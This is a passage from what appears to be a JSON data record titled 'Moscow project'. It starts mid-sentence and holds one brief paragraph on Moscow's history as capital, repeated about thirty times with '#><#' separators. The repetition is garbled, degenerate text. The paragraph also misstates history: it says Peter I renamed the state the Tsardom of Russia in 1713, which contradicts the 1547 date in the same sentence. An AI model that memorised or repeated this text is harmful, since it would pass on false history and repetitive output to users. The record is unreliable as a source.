1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #><# The city of Moscow gradually grew around the Moscow Kremlin, beginning in the 14th century. It was the capital of the Grand Duchy of Moscow (or Muscovy), from 1340 to 1547 and in 1713 renamed as the Tsardom of Russia by Peter I \"the Great\" (when the capital was moved to Saint Petersburg). Moscow was the capital of the Russian Soviet Federative Socialist Republic from 1918, which then became the Soviet Union (1922 to 1991), and since 1991 has served as capital of the Russian Federation. #>",
 "title": "Moscow project"
}